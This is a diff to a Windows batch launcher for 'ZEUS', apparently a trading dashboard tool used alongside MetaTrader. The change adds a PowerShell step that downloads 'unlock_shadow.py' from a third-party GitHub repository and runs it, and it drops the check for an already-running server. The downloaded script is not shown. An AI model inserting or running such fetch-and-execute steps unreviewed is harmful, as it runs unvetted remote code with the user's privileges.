@@ -10,9 +10,9 @@ if not exist "%PY%" (
   exit /b 2
 )
 echo Starting ZEUS. This does not open Chrome or Edge.
-powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing -Uri '%BASE%/zeus_wait.py' -OutFile '%CD%\zeus_wait.py'; Invoke-WebRequest -UseBasicParsing -Uri '%BASE%/zeus_desktop.py' -OutFile '%CD%\zeus_desktop.py'"
-powershell -NoProfile -Command "try { Invoke-WebRequest -UseBasicParsing -Uri 'http://127.0.0.1:8783/' -TimeoutSec 3 | Out-Null; exit 0 } catch { exit 1 }"
-if not errorlevel 1 goto openwindow
+powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing -Uri '%BASE%/zeus_wait.py' -OutFile '%CD%\zeus_wait.py'; Invoke-WebRequest -UseBasicParsing -Uri '%BASE%/zeus_desktop.py' -OutFile '%CD%\zeus_desktop.py'; Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/madexps3-tech/zeus-desktop-fix/766e2b914a3d7024981ae33ba3f8e110fc489a17/unlock_shadow.py' -OutFile '%CD%\unlock_shadow.py'"
+"%PY%" "%CD%\unlock_shadow.py" "%CD%"
+if errorlevel 1 goto fail
 echo Leave MetaTrader logged in.
 echo Closing any stuck ZEUS loader.
 powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" | Where-Object { $_.CommandLine -like '*zeus3.v19.web*' -or $_.ExecutablePath -like '*ZEUS_RC11_WINDOWS_RETRY\runtime\python*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
@@ -30,7 +30,6 @@ echo Starting one dashboard loader.
 start "ZEUS Server" /D "%CD%" "%PY%" -u -m zeus3.v19.web
 "%PY%" "%CD%\zeus_wait.py"
 if errorlevel 1 goto fail
-:openwindow
 echo Opening the ZEUS window.
 "%PY%" -c "import webview" >nul 2>&1
 if errorlevel 1 (
